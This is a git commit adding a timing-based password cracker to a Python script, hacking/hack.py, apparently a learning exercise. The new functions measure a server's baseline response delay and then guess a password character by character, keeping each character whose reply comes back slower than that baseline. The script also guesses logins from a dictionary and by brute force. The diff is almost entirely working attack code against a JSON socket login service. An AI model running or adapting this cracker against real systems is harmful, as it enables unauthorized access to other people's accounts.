7d7f846a47fcc79819a80fec39cf2ebdc772ba53
Igor <GI_Something@protonmail.com>
2020-09-03 11:19:59 +0300

    feat: Add possibility to hack password using time-based vulnerability

--- hacking/hack.py
+++ hacking/hack.py
@@ -1,6 +1,7 @@
 import socket
 import sys
 import json
+from datetime import datetime
 from itertools import product
 from string import digits, ascii_letters
 
@@ -30,6 +31,37 @@ def hack_pass_using_exception(socket_, login, chars):
             if response == exception_msg:
                 password_builder = temp_pass
                 break
+
+
+def hack_pass_using_response_delay(socket_, login, chars, delay_percent):
+    success_msg = b'{"result": "Connection success!"}'
+    password_builder = ""
+    delay = measure_response_time(socket_, login, "", 30)
+    delay *= delay_percent / 100 + 1
+
+    while True:
+        for c in chars:
+            temp_pass = password_builder + c
+            socket_.send(json.dumps({"login": login, "password": temp_pass}).encode())
+            start = datetime.now().timestamp()
+            response = socket_.recv(1024)
+            end = datetime.now().timestamp()
+            if response == success_msg:
+                return temp_pass
+            if end - start >= delay:
+                password_builder = temp_pass
+                break
+
+
+def measure_response_time(socket_, login, password, tries):
+    dt_accumulator = 0
+    for _ in range(tries):
+        socket_.send(json.dumps({"login": login, "password": password}).encode())
+        start = datetime.now().timestamp()
+        response = socket_.recv(1024)
+        end = datetime.now().timestamp()
+        dt_accumulator += end - start
+    return dt_accumulator / tries
 
 
 def hack_single_pass_server(socket_, passwords):
@@ -62,7 +94,7 @@ def hack():
         login = hack_login(st, dict_based_gen(read_lines_from_file("dictionaries/typical_logins.txt")))
         if not login:
             login = hack_login(st, password_gen(16, digits + ascii_letters))
-        password = hack_pass_using_exception(st, login, digits + ascii_letters)
+        password = hack_pass_using_response_delay(st, login, digits + ascii_letters, 5)
     return json.dumps({"login": login, "password": password})
 
 
